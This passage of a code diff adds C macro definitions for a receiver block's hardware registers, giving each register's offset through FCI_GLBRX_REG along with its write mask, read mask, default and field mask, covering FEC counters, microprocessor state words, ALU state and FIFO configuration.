+#define ZR_ILV_PMD_CNTRS1_WMASK (0xFFFFFFFF)
+#define ZR_ILV_PMD_CNTRS1_MASK (0xFFFFFFFF)
+#define ZR_ILV_PMD_CNTRS1_DEFAULT (0x0000)
+#define ZR_ILV_PMD_CNTRS1_FMASK (0xFFFFFFFF)
+#define ZIR_DL_REL0            FCI_GLBRX_REG(0x00E4)
+#define ZIR_DL_REL0_WMASK      (0x3FFFFFF)
+#define ZIR_DL_REL0_MASK       (0x3FFFFFF)
+#define ZIR_DL_REL0_DEFAULT    (0x0000)
+#define ZIR_DL_REL0_FMASK      (0x3FFFFFF)
+#define ZIR_NL_REL0            FCI_GLBRX_REG(0x00E8)
+#define ZIR_NL_REL0_WMASK      (0x3FF07FF)
+#define ZIR_NL_REL0_MASK       (0x3FF07FF)
+#define ZIR_NL_REL0_DEFAULT    (0x0000)
+#define ZIR_NL_REL0_FMASK      (0x3FF07FF)
+#define ZIR_DMETRIC0           FCI_GLBRX_REG(0x00EC)
+#define ZIR_DMETRIC0_WMASK     (0x3FFFFFF)
+#define ZIR_DMETRIC0_MASK      (0x3FFFFFF)
+#define ZIR_DMETRIC0_DEFAULT   (0x0000)
+#define ZIR_DMETRIC0_FMASK     (0x3FFFFFF)
+#define ZIR_DMETRIC_CTRL       FCI_GLBRX_REG(0x00F0)
+#define ZIR_DMETRIC_CTRL_WMASK (0xFF1300FF)
+#define ZIR_DMETRIC_CTRL_MASK  (0xFF1300FF)
+#define ZIR_DMETRIC_CTRL_DEFAULT (0x0000)
+#define ZIR_DMETRIC_CTRL_FMASK (0xFF1300FF)
+#define ZIR_LPBITS             FCI_GLBRX_REG(0x00F4)
+#define ZIR_LPBITS_WMASK       (0xFFFF)
+#define ZIR_LPBITS_MASK        (0xFFFF)
+#define ZIR_LPBITS_DEFAULT     (0x0000)
+#define ZIR_LPBITS_FMASK       (0xFFFF)
+#define ZR_CW_COUNT            FCI_GLBRX_REG(0x00F8)
+#define ZR_CW_COUNT_WMASK      (0xFFFF)
+#define ZR_CW_COUNT_MASK       (0xFFFF)
+#define ZR_CW_COUNT_DEFAULT    (0x0000)
+#define ZR_CW_COUNT_FMASK      (0xFFFF)
+#define ZR_FEC_CNT             FCI_GLBRX_REG(0x00FC)
+#define ZR_FEC_CNT_WMASK       (0xFFFFFFFF)
+#define ZR_FEC_CNT_MASK        (0xFFFFFFFF)
+#define ZR_FEC_CNT_DEFAULT     (0x0000)
+#define ZR_FEC_CNT_FMASK       (0xFFFFFFFF)
+#define ZR_UNCORR_CW0          FCI_GLBRX_REG(0x0100)
+#define ZR_UNCORR_CW0_WMASK    (0xFFFFFFFF)
+#define ZR_UNCORR_CW0_MASK     (0xFFFFFFFF)
+#define ZR_UNCORR_CW0_DEFAULT  (0x0000)
+#define ZR_UNCORR_CW0_FMASK    (0xFFFFFFFF)
+#define ZR_UNCORR_CW1          FCI_GLBRX_REG(0x0104)
+#define ZR_UNCORR_CW1_WMASK    (0xFFFFFFFF)
+#define ZR_UNCORR_CW1_MASK     (0xFFFFFFFF)
+#define ZR_UNCORR_CW1_DEFAULT  (0x0000)
+#define ZR_UNCORR_CW1_FMASK    (0xFFFFFFFF)
+#define ZR_WB_SCORE_CTL        FCI_GLBRX_REG(0x0108)
+#define ZR_WB_SCORE_CTL_WMASK  (0xFF7F5FFF)
+#define ZR_WB_SCORE_CTL_MASK   (0xFF7F5FFF)
+#define ZR_WB_SCORE_CTL_DEFAULT (0x0000)
+#define ZR_WB_SCORE_CTL_FMASK  (0xFF7F5FFF)
+#define ZR_WB_SCORE2           FCI_GLBRX_REG(0x010C)
+#define ZR_WB_SCORE2_WMASK     (0xFFFF)
+#define ZR_WB_SCORE2_MASK      (0xFFFF)
+#define ZR_WB_SCORE2_DEFAULT   (0x0000)
+#define ZR_WB_SCORE2_FMASK     (0xFFFF)
+#define ZR_UPROC_ENA           FCI_GLBRX_REG(0x0110)
+#define ZR_UPROC_ENA_WMASK     (0x03FF)
+#define ZR_UPROC_ENA_MASK      (0x03FF)
+#define ZR_UPROC_ENA_DEFAULT   (0x0000)
+#define ZR_UPROC_ENA_FMASK     (0x03FF)
+#define ZR_UPROC01_BASE        FCI_GLBRX_REG(0x0114)
+#define ZR_UPROC01_BASE_WMASK  (0xFFFFFFFF)
+#define ZR_UPROC01_BASE_MASK   (0xFFFFFFFF)
+#define ZR_UPROC01_BASE_DEFAULT (0x0000)
+#define ZR_UPROC01_BASE_FMASK  (0xFFFFFFFF)
+#define ZR_UPROC23_BASE        FCI_GLBRX_REG(0x0118)
+#define ZR_UPROC23_BASE_WMASK  (0xFFFFFFFF)
+#define ZR_UPROC23_BASE_MASK   (0xFFFFFFFF)
+#define ZR_UPROC23_BASE_DEFAULT (0x0000)
+#define ZR_UPROC23_BASE_FMASK  (0xFFFFFFFF)
+#define ZR_UPROC45_BASE        FCI_GLBRX_REG(0x011C)
+#define ZR_UPROC45_BASE_WMASK  (0xFFFFFFFF)
+#define ZR_UPROC45_BASE_MASK   (0xFFFFFFFF)
+#define ZR_UPROC45_BASE_DEFAULT (0x0000)
+#define ZR_UPROC45_BASE_FMASK  (0xFFFFFFFF)
+#define ZR_UPROC67_BASE        FCI_GLBRX_REG(0x0120)
+#define ZR_UPROC67_BASE_WMASK  (0xFFFFFFFF)
+#define ZR_UPROC67_BASE_MASK   (0xFFFFFFFF)
+#define ZR_UPROC67_BASE_DEFAULT (0x0000)
+#define ZR_UPROC67_BASE_FMASK  (0xFFFFFFFF)
+#define ZR_UPROC89_BASE        FCI_GLBRX_REG(0x0124)
+#define ZR_UPROC89_BASE_WMASK  (0xFFFFFFFF)
+#define ZR_UPROC89_BASE_MASK   (0xFFFFFFFF)
+#define ZR_UPROC89_BASE_DEFAULT (0x0000)
+#define ZR_UPROC89_BASE_FMASK  (0xFFFFFFFF)
+#define ZR_UPROC_INT           FCI_GLBRX_REG(0x0128)
+#define ZR_UPROC_INT_WMASK     (0x03FF)
+#define ZR_UPROC_INT_MASK      (0x03FF)
+#define ZR_UPROC_INT_DEFAULT   (0x0000)
+#define ZR_UPROC_INT_FMASK     (0x03FF)
+#define ZR_UPROC0_STATE0       FCI_GLBRX_REG(0x012C)
+#define ZR_UPROC0_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC0_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC0_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC0_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE1       FCI_GLBRX_REG(0x0130)
+#define ZR_UPROC0_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC0_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC0_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE2       FCI_GLBRX_REG(0x0134)
+#define ZR_UPROC0_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC0_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC0_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE3       FCI_GLBRX_REG(0x0138)
+#define ZR_UPROC0_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC0_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC0_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE4       FCI_GLBRX_REG(0x013C)
+#define ZR_UPROC0_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC0_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC0_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC0_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE0       FCI_GLBRX_REG(0x0140)
+#define ZR_UPROC1_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC1_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC1_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC1_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE1       FCI_GLBRX_REG(0x0144)
+#define ZR_UPROC1_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC1_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC1_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE2       FCI_GLBRX_REG(0x0148)
+#define ZR_UPROC1_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC1_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC1_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE3       FCI_GLBRX_REG(0x014C)
+#define ZR_UPROC1_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC1_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC1_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE4       FCI_GLBRX_REG(0x0150)
+#define ZR_UPROC1_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC1_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC1_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC1_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE0       FCI_GLBRX_REG(0x0154)
+#define ZR_UPROC2_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC2_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC2_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC2_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE1       FCI_GLBRX_REG(0x0158)
+#define ZR_UPROC2_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC2_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC2_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE2       FCI_GLBRX_REG(0x015C)
+#define ZR_UPROC2_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC2_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC2_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE3       FCI_GLBRX_REG(0x0160)
+#define ZR_UPROC2_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC2_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC2_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE4       FCI_GLBRX_REG(0x0164)
+#define ZR_UPROC2_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC2_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC2_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC2_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE0       FCI_GLBRX_REG(0x0168)
+#define ZR_UPROC3_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC3_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC3_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC3_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE1       FCI_GLBRX_REG(0x016C)
+#define ZR_UPROC3_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC3_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC3_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE2       FCI_GLBRX_REG(0x0170)
+#define ZR_UPROC3_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC3_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC3_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE3       FCI_GLBRX_REG(0x0174)
+#define ZR_UPROC3_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC3_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC3_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE4       FCI_GLBRX_REG(0x0178)
+#define ZR_UPROC3_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC3_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC3_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC3_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE0       FCI_GLBRX_REG(0x017C)
+#define ZR_UPROC4_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC4_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC4_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC4_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE1       FCI_GLBRX_REG(0x0180)
+#define ZR_UPROC4_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC4_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC4_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE2       FCI_GLBRX_REG(0x0184)
+#define ZR_UPROC4_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC4_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC4_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE3       FCI_GLBRX_REG(0x0188)
+#define ZR_UPROC4_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC4_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC4_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE4       FCI_GLBRX_REG(0x018C)
+#define ZR_UPROC4_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC4_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC4_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC4_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE0       FCI_GLBRX_REG(0x0190)
+#define ZR_UPROC5_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC5_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC5_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC5_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE1       FCI_GLBRX_REG(0x0194)
+#define ZR_UPROC5_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC5_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC5_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE2       FCI_GLBRX_REG(0x0198)
+#define ZR_UPROC5_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC5_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC5_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE3       FCI_GLBRX_REG(0x019C)
+#define ZR_UPROC5_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC5_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC5_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE4       FCI_GLBRX_REG(0x01A0)
+#define ZR_UPROC5_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC5_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC5_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC5_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE0       FCI_GLBRX_REG(0x01A4)
+#define ZR_UPROC6_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC6_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC6_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC6_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE1       FCI_GLBRX_REG(0x01A8)
+#define ZR_UPROC6_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC6_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC6_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE2       FCI_GLBRX_REG(0x01AC)
+#define ZR_UPROC6_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC6_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC6_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE3       FCI_GLBRX_REG(0x01B0)
+#define ZR_UPROC6_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC6_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC6_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE4       FCI_GLBRX_REG(0x01B4)
+#define ZR_UPROC6_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC6_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC6_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC6_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE0       FCI_GLBRX_REG(0x01B8)
+#define ZR_UPROC7_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC7_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC7_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC7_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE1       FCI_GLBRX_REG(0x01BC)
+#define ZR_UPROC7_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC7_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC7_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE2       FCI_GLBRX_REG(0x01C0)
+#define ZR_UPROC7_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC7_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC7_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE3       FCI_GLBRX_REG(0x01C4)
+#define ZR_UPROC7_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC7_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC7_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE4       FCI_GLBRX_REG(0x01C8)
+#define ZR_UPROC7_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC7_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC7_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC7_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE0       FCI_GLBRX_REG(0x01CC)
+#define ZR_UPROC8_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC8_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC8_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC8_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE1       FCI_GLBRX_REG(0x01D0)
+#define ZR_UPROC8_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC8_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC8_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE2       FCI_GLBRX_REG(0x01D4)
+#define ZR_UPROC8_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC8_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC8_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE3       FCI_GLBRX_REG(0x01D8)
+#define ZR_UPROC8_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC8_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC8_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE4       FCI_GLBRX_REG(0x01DC)
+#define ZR_UPROC8_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC8_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC8_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC8_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE0       FCI_GLBRX_REG(0x01E0)
+#define ZR_UPROC9_STATE0_WMASK (0xFFFFFF00)
+#define ZR_UPROC9_STATE0_MASK  (0xFFFFFFFF)
+#define ZR_UPROC9_STATE0_DEFAULT (0x0000)
+#define ZR_UPROC9_STATE0_FMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE1       FCI_GLBRX_REG(0x01E4)
+#define ZR_UPROC9_STATE1_WMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE1_MASK  (0xFFFFFFFF)
+#define ZR_UPROC9_STATE1_DEFAULT (0x0000)
+#define ZR_UPROC9_STATE1_FMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE2       FCI_GLBRX_REG(0x01E8)
+#define ZR_UPROC9_STATE2_WMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE2_MASK  (0xFFFFFFFF)
+#define ZR_UPROC9_STATE2_DEFAULT (0x0000)
+#define ZR_UPROC9_STATE2_FMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE3       FCI_GLBRX_REG(0x01EC)
+#define ZR_UPROC9_STATE3_WMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE3_MASK  (0xFFFFFFFF)
+#define ZR_UPROC9_STATE3_DEFAULT (0x0000)
+#define ZR_UPROC9_STATE3_FMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE4       FCI_GLBRX_REG(0x01F0)
+#define ZR_UPROC9_STATE4_WMASK (0xFFFFFFFF)
+#define ZR_UPROC9_STATE4_MASK  (0xFFFFFFFF)
+#define ZR_UPROC9_STATE4_DEFAULT (0x0000)
+#define ZR_UPROC9_STATE4_FMASK (0xFFFFFFFF)
+#define ZR_UPROC_STATE5        FCI_GLBRX_REG(0x01F4)
+#define ZR_UPROC_STATE5_WMASK  (0xFFFFF)
+#define ZR_UPROC_STATE5_MASK   (0xFFFFF)
+#define ZR_UPROC_STATE5_DEFAULT (0x0000)
+#define ZR_UPROC_STATE5_FMASK  (0xFFFFF)
+#define ZR_ALU_STATE           FCI_GLBRX_REG(0x01F8)
+#define ZR_ALU_STATE_WMASK     (0x3FFFFFFF)
+#define ZR_ALU_STATE_MASK      (0x3FFFFFFF)
+#define ZR_ALU_STATE_DEFAULT   (0x0000)
+#define ZR_ALU_STATE_FMASK     (0x3FFFFFFF)
+#define ZR_ALU_CLI_REQ         FCI_GLBRX_REG(0x01FC)
+#define ZR_ALU_CLI_REQ_WMASK   (0x03FF)
+#define ZR_ALU_CLI_REQ_MASK    (0x03FF)
+#define ZR_ALU_CLI_REQ_DEFAULT (0x0000)
+#define ZR_ALU_CLI_REQ_FMASK   (0x03FF)
+#define ZR_WB_DBG              FCI_GLBRX_REG(0x0200)
+#define ZR_WB_DBG_WMASK        (0x0000)
+#define ZR_WB_DBG_MASK         (0x01FF)
+#define ZR_WB_DBG_DEFAULT      (0x0000)
+#define ZR_WB_DBG_FMASK        (0x01FF)
+#define ZR_WB_RCHK0            FCI_GLBRX_REG(0x0204)
+#define ZR_WB_RCHK0_WMASK      (0x0000)
+#define ZR_WB_RCHK0_MASK       (0xFFFFFFFF)
+#define ZR_WB_RCHK0_DEFAULT    (0x0000)
+#define ZR_WB_RCHK0_FMASK      (0xFFFFFFFF)
+#define ZR_WB_RCHK1            FCI_GLBRX_REG(0x0208)
+#define ZR_WB_RCHK1_WMASK      (0x0000)
+#define ZR_WB_RCHK1_MASK       (0xFFFFFFFF)
+#define ZR_WB_RCHK1_DEFAULT    (0x0000)
+#define ZR_WB_RCHK1_FMASK      (0xFFFFFFFF)
+#define ZR_WB_RCHK2            FCI_GLBRX_REG(0x020C)
+#define ZR_WB_RCHK2_WMASK      (0x0000)
+#define ZR_WB_RCHK2_MASK       (0xFFFFFFFF)
+#define ZR_WB_RCHK2_DEFAULT    (0x0000)
+#define ZR_WB_RCHK2_FMASK      (0xFFFFFFFF)
+#define ZR_WB_RCHK3            FCI_GLBRX_REG(0x0210)
+#define ZR_WB_RCHK3_WMASK      (0x0000)
+#define ZR_WB_RCHK3_MASK       (0xFFFFFFFF)
+#define ZR_WB_RCHK3_DEFAULT    (0x0000)
+#define ZR_WB_RCHK3_FMASK      (0xFFFFFFFF)
+#define ZR_WB_RSYND0           FCI_GLBRX_REG(0x0214)
+#define ZR_WB_RSYND0_WMASK     (0x0000)
+#define ZR_WB_RSYND0_MASK      (0xFFFFFFFF)
+#define ZR_WB_RSYND0_DEFAULT   (0x0000)
+#define ZR_WB_RSYND0_FMASK     (0xFFFFFFFF)
+#define ZR_WB_RSYND1           FCI_GLBRX_REG(0x0218)
+#define ZR_WB_RSYND1_WMASK     (0x0000)
+#define ZR_WB_RSYND1_MASK      (0xFFFFFFFF)
+#define ZR_WB_RSYND1_DEFAULT   (0x0000)
+#define ZR_WB_RSYND1_FMASK     (0xFFFFFFFF)
+#define ZR_WB_RSYND2           FCI_GLBRX_REG(0x021C)
+#define ZR_WB_RSYND2_WMASK     (0x0000)
+#define ZR_WB_RSYND2_MASK      (0xFFFFFFFF)
+#define ZR_WB_RSYND2_DEFAULT   (0x0000)
+#define ZR_WB_RSYND2_FMASK     (0xFFFFFFFF)
+#define ZR_WB_RSYND3           FCI_GLBRX_REG(0x0220)
+#define ZR_WB_RSYND3_WMASK     (0x0000)
+#define ZR_WB_RSYND3_MASK      (0xFFFFFFFF)
+#define ZR_WB_RSYND3_DEFAULT   (0x0000)
+#define ZR_WB_RSYND3_FMASK     (0xFFFFFFFF)
+#define ZR_WB_AJ0              FCI_GLBRX_REG(0x0224)
+#define ZR_WB_AJ0_WMASK        (0x0000)
+#define ZR_WB_AJ0_MASK         (0xFFFFFFFF)
+#define ZR_WB_AJ0_DEFAULT      (0x0000)
+#define ZR_WB_AJ0_FMASK        (0xFFFFFFFF)
+#define ZR_WB_AJ1              FCI_GLBRX_REG(0x0228)
+#define ZR_WB_AJ1_WMASK        (0x0000)
+#define ZR_WB_AJ1_MASK         (0xFFFFFFFF)
+#define ZR_WB_AJ1_DEFAULT      (0x0000)
+#define ZR_WB_AJ1_FMASK        (0xFFFFFFFF)
+#define ZR_WB_AJ2              FCI_GLBRX_REG(0x022C)
+#define ZR_WB_AJ2_WMASK        (0x0000)
+#define ZR_WB_AJ2_MASK         (0xFFFFFFFF)
+#define ZR_WB_AJ2_DEFAULT      (0x0000)
+#define ZR_WB_AJ2_FMASK        (0xFFFFFFFF)
+#define ZR_WB_AJ3              FCI_GLBRX_REG(0x0230)
+#define ZR_WB_AJ3_WMASK        (0x0000)
+#define ZR_WB_AJ3_MASK         (0xFFFFFFFF)
+#define ZR_WB_AJ3_DEFAULT      (0x0000)
+#define ZR_WB_AJ3_FMASK        (0xFFFFFFFF)
+#define ZR_FIFO_ACCESS         FCI_GLBRX_REG(0x0234)
+#define ZR_FIFO_ACCESS_WMASK   (0xBFFFF7FF)
+#define ZR_FIFO_ACCESS_MASK    (0xBFFFFFFF)
+#define ZR_FIFO_ACCESS_DEFAULT (0x0800)
+#define ZR_FIFO_ACCESS_FMASK   (0xBFFFFFFF)
+#define ZR_CONFIG              FCI_GLBRX_REG(0x0238)
+#define ZR_CONFIG_WMASK        (0xFFFF)
+#define ZR_CONFIG_MASK         (0xFFFF)
+#define ZR_CONFIG_DEFAULT      (0x0000)
+#define ZR_CONFIG_FMASK        (0xFFFF)
+#define ZR_PMS_SIZE            FCI_GLBRX_REG(0x023C)
+#define ZR_PMS_SIZE_WMASK      (0xFFFFFFFF)
+#define ZR_PMS_SIZE_MASK       (0xFFFFFFFF)
+#define ZR_PMS_SIZE_DEFAULT    (0x0000)
+#define ZR_PMS_SIZE_FMASK      (0xFFFFFFFF)
+#define ZR_DT_SIZE             FCI_GLBRX_REG(0x0240)
+#define ZR_DT_SIZE_WMASK       (0xFFFFFFFF)
+#define ZR_DT_SIZE_MASK        (0xFFFFFFFF)
+#define ZR_DT_SIZE_DEFAULT     (0x0000)
+#define ZR_DT_SIZE_FMASK       (0xFFFFFFFF)
+#define ZR_QTDTB_CONFIG_LP0    FCI_GLBRX_REG(0x0244)
